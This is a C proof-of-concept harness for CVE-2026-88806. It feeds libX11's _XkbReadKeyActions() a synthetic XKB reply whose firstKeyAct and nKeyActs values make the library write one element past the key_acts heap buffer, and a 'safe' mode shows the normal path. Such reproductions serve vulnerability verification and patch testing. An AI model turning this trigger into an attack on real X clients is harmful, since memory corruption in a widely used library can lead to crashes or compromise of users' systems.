/*
 * libx11xkb2shell — CVE-2026-88806 harness.
 *
 * Calls the real _XkbReadKeyActions() from pinned libX11 1.8.13/1.8.14 with
 * a synthetic xkbGetMapReply and a synthetic XkbReadBuffer. No X server and
 * no external connection are involved. The only source change is the local
 * expose.patch (static -> external linkage); it changes no logic.
 *
 * Server-controlled fields are rep->firstKeyAct (CARD8) and rep->nKeyActs.
 * With max_key_code = 8, key_acts has 9 entries; firstKeyAct = 8 and
 * nKeyActs = 2 make the second (zero-action) descriptor write key_acts[9]=0
 * past the allocation. The old check allows index max+1; the fix rejects
 * firstKeyAct + nKeyActs > max+1 before the loop. key_sym_map is deliberately
 * over-allocated (64 entries) so no earlier read can mask the WRITE. The
 * action payload carries chosen 0x5a bytes; the overflowing value is zero.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/XKBlib.h>
#include <X11/extensions/XKBproto.h>
#include "XKBlibint.h"

extern Status _XkbReadKeyActions(XkbReadBufferPtr buf, XkbDescPtr info,
                                 xkbGetMapReply *rep);

int main(int argc, char **argv)
{
    int safe = (argc > 1 && strcmp(argv[1], "safe") == 0);
    XkbDescRec xkb;
    xkbGetMapReply rep;
    XkbReadBufferRec buf;
    unsigned char data[256];

    memset(&xkb, 0, sizeof(xkb));
    xkb.device_spec = 3;
    xkb.min_key_code = 8;
    xkb.max_key_code = 8;
    xkb.map = (XkbClientMapPtr) calloc(1, sizeof(XkbClientMapRec));
    xkb.map->key_sym_map = (XkbSymMapPtr) calloc(64, sizeof(XkbSymMapRec));
    xkb.server = (XkbServerMapPtr) calloc(1, sizeof(XkbServerMapRec));
    xkb.server->key_acts = (unsigned short *) calloc(9, sizeof(unsigned short));
    xkb.server->acts = (XkbAction *) calloc(256, sizeof(XkbAction));
    xkb.server->size_acts = 256;    /* fast path: no NULL act-array copy */
    if (!xkb.map || !xkb.map->key_sym_map || !xkb.server ||
        !xkb.server->key_acts || !xkb.server->acts)
        return 2;

    memset(&rep, 0, sizeof(rep));
    rep.firstKeyAct = safe ? 1 : 8;
    rep.nKeyActs = 2;

    memset(data, 0, sizeof(data));
    data[0] = 1;                    /* numDesc[0]: one action for key 8 */
    data[1] = 0;                    /* numDesc[1]: zero actions for key 9 */
    memset(data + 4, 0x5a, 16);     /* padded action payload */

    memset(&buf, 0, sizeof(buf));
    buf.size = (int) sizeof(data);
    buf.start = (char *) data;
    buf.data = (char *) data;

    {
        Status st = _XkbReadKeyActions(&buf, &xkb, &rep);
        printf("MODE=%s firstKeyAct=%u nKeyActs=%u status=%d acts=%d\n",
               safe ? "safe" : "attack", rep.firstKeyAct, rep.nKeyActs,
               (int) st, xkb.server->num_acts);
        fflush(stdout);
    }
    free(xkb.server->acts);
    free(xkb.server->key_acts);
    free(xkb.server);
    free(xkb.map->key_sym_map);
    free(xkb.map);
    return 0;
}
